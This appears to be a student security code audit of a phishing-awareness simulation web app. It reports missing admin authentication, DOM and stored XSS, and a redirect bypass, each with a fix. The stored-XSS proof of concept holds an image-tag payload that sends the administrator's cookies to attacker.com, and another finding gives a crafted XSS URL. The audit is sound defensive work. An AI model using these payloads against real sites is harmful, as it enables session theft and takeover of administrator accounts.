# Security Code Audit Report: Phishing Awareness Simulation Platform

**Prepared for:** Academic Coursework / Portfolio Evaluation  
**Auditor:** Cybersecurity Engineering Analyst  
**Date:** August 11, 2026  
**Status:** Completed

---

## 1. Executive Summary

A comprehensive security code review was performed on the Phishing Awareness Simulation Platform. The objective of this audit was to identify security vulnerabilities, implementation flaws, and architectural weaknesses that could be exploited by malicious actors or lead to system compromise. 

The review identified **4 key vulnerabilities** ranging from **Critical** to **Medium** severity:
*   **1 Critical:** Broken Access Control (Missing Authentication on Admin Panel).
*   **2 High:** DOM-based and Stored Cross-Site Scripting (XSS).
*   **1 Medium:** Incomplete Redirect Execution Flow.

If left unremediated, these flaws would allow unauthenticated external users to access the administrative dashboard, wipe database records, and execute arbitrary JavaScript code within the context of the administrator's browser session.

---

## 2. Severity Classification

Vulnerabilities are classified based on their potential impact and ease of exploitability:

| Severity | Description |
| :--- | :--- |
| **CRITICAL** | Direct access to administrative controls, data compromise, or remote code execution with no user interaction required. |
| **HIGH** | Significant exposure of data or administrative capabilities. Requires basic user interaction (e.g., viewing a log page). |
| **MEDIUM** | Moderate impact; exposes control flow anomalies, information disclosure, or security guard bypasses. |
| **LOW** | Minor code quality or hardening issues with low probability of exploit. |

---

## 3. Summary of Findings

| ID | Finding Title | Severity | Status | Affected Component |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | Missing Authentication / Broken Access Control on Admin Panel | **CRITICAL** | Open | `index.html` / Dashboard Routes |
| **SEC-02** | DOM-based Cross-Site Scripting (XSS) via URL Parameters | **HIGH** | Open | `email_preview.html` |
| **SEC-03** | Stored Cross-Site Scripting (XSS) via Whitelist Names & Logs | **HIGH** | Open | `dashboard.js`, `app.js` |
| **SEC-04** | Redirection without Execution Termination (Redirect Bypass) | **MEDIUM** | Open | `email_preview.html` |

---

## 4. Detailed Vulnerability Analysis

### SEC-01: Missing Authentication & Authorization on Admin Panel
*   **Severity:** **CRITICAL**
*   **OWASP Top 10 Reference:** A01:2021-Broken Access Control
*   **Description:** The administrative interface (`index.html`) is accessible to anyone who navigates to the root path. There is no session check, password prompt, or JWT verification matching administrators. Anyone can view participant records, configure campaigns, track active clicks, or invoke `triggerResetSimulation()` to wipe system data.

#### Vulnerable Code Snippet (`index.html`):
```html
<!-- Admin Control Panel is loaded directly without authentication guards -->
<aside class="sidebar">
  <button class="sidebar-btn active" id="btn-tab-dash" onclick="switchTab('dash')">📊 Overview Dashboard</button>
  ...
  <button class="sidebar-btn" onclick="triggerResetSimulation()" style="color: var(--accent-rose);">🔄 Reset Simulation Data</button>
</aside>
```

#### Remediation:
Implement HTTP-Only Session cookies using JWTs. Restrict access to administrative endpoints and pages using an authorization gateway.
*See secure implementation details in [secure_admin_auth.js](file:///c:/Users/asdmin/OneDrive/Desktop/Security-Code-Review/secure_admin_auth.js).*

---

### SEC-02: DOM-based XSS via URL Parameter in Email Preview
*   **Severity:** **HIGH**
*   **OWASP Top 10 Reference:** A03:2021-Injection (Cross-Site Scripting)
*   **Description:** The `email_preview.html` script extracts the `targetEmail` string from the query string parameters and interpolates it directly into the email HTML template. This template is then rendered to the page using `.innerHTML`.

#### Vulnerable Code Snippet (`email_preview.html`):
```javascript
const params = new URLSearchParams(window.location.search);
const targetEmail = params.get("targetEmail") || "";
const finalEmail = targetEmail || campaign.targetEmail;
...
const emailTemplate = `
  <p>Dear user with address <strong>${finalEmail}</strong>,</p>
`;
document.getElementById("email-body").innerHTML = emailTemplate;
```

#### Proof of Concept (PoC):
An attacker crafts a URL targeting a whitelisted user (or bypasses redirect validation, see SEC-04) that injects a script payload:
```
http://localhost:3000/email_preview.html?targetEmail=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

#### Remediation:
Escape all variables inserted into HTML strings. Create a robust sanitization helper.
```javascript
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, m => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'
  })[m]);
}
const escapedEmail = escapeHTML(finalEmail);
```
*See secure implementation details in [secure_email_preview.html](file:///c:/Users/asdmin/OneDrive/Desktop/Security-Code-Review/secure_email_preview.html).*

---

### SEC-03: Stored XSS via Whitelist Registrations and System Event Logs
*   **Severity:** **HIGH**
*   **OWASP Top 10 Reference:** A03:2021-Injection (Stored Cross-Site Scripting)
*   **Description:**
    When a participant enters their name in the Consent Form (`consent.html`), the name is whitelisted and logged. In `dashboard.js`, these fields are loaded from the database state and rendered into the admin dashboard table and log listings using `.innerHTML` without escaping. 

#### Vulnerable Code Snippet (`dashboard.js`):
```javascript
state.logs.forEach(log => {
  const li = document.createElement("li");
  li.innerHTML = `<span class="log-time">[${log.timestamp}]</span> <span>${log.message}</span>`;
  logListEl.appendChild(li);
});
```

#### Proof of Concept (PoC):
1. Navigate to the public page `consent.html`.
2. Fill out the consent form. In the "Full Name" input box, submit the following payload:
   ```html
   <img src="x" onerror="fetch('http://attacker.com/steal?cookies='+document.cookie)">
   ```
3. When the administrator opens `index.html` to review statistics, the payload executes, sending their session cookie parameters to the attacker's server.

#### Remediation:
Do not write variable text to `.innerHTML`. Always use safe DOM API properties like `.textContent`, or generate elements dynamically via `document.createElement()`.
```javascript
state.logs.forEach(log => {
  const li = document.createElement("li");
  const msgSpan = document.createElement("span");
  msgSpan.textContent = log.message; // Safe: browser treats text as data, not executable HTML
  li.appendChild(msgSpan);
  logListEl.appendChild(li);
});
```
*See secure implementation details in [secure_dashboard.js](file:///c:/Users/asdmin/OneDrive/Desktop/Security-Code-Review/secure_dashboard.js).*

---

### SEC-04: Redirection without Execution Termination (Redirect Bypass)
*   **Severity:** **MEDIUM**
*   **OWASP Top 10 Reference:** A04:2021-Secure Design
*   **Description:** In `email_preview.html`, if the target email is not in the whitelist, the code assigns `window.location.href = "consent.html"` to redirect the browser. However, setting `window.location.href` is asynchronous and **does not stop script execution**. The rest of the page loads, the templates render, and the XSS payload (if present) executes before the redirection completes.

#### Vulnerable Code Snippet (`email_preview.html`):
```javascript
if (!isEmailWhitelisted(finalEmail)) {
  alert("Verification Failed: Email is not whitelisted. Redirecting...");
  window.location.href = "consent.html";
  // Missing termination: the browser keeps parsing and runs the template block below!
}
...
document.getElementById("email-body").innerHTML = emailTemplate;
```

#### Remediation:
Ensure script execution stops immediately after setting the redirect URL.
```javascript
if (!isEmailWhitelisted(finalEmail)) {
  alert("Verification Failed: Email is not whitelisted. Redirecting...");
  window.location.href = "consent.html";
  throw new Error("Execution halted: User not whitelisted"); // Stops engine execution
}
```
*See secure implementation details in [secure_email_preview.html](file:///c:/Users/asdmin/OneDrive/Desktop/Security-Code-Review/secure_email_preview.html).*

---

## 5. Conclusion & Recommendations

The Phishing Simulation Platform demonstrates significant design weaknesses. The most vital security recommendations are:
1.  **Shift Security Left:** Adopt secure coding practices early in development. Integrate automated tools like Semgrep to detect `innerHTML` issues before files are checked in.
2.  **Enforce Context-Aware Encoding:** Mandate the use of `.textContent` instead of `.innerHTML` for rendering user-supplied strings.
3.  **Strict Boundary Controls:** Protect administrative functionalities with strong session verifications rather than relying on "security by obscurity."
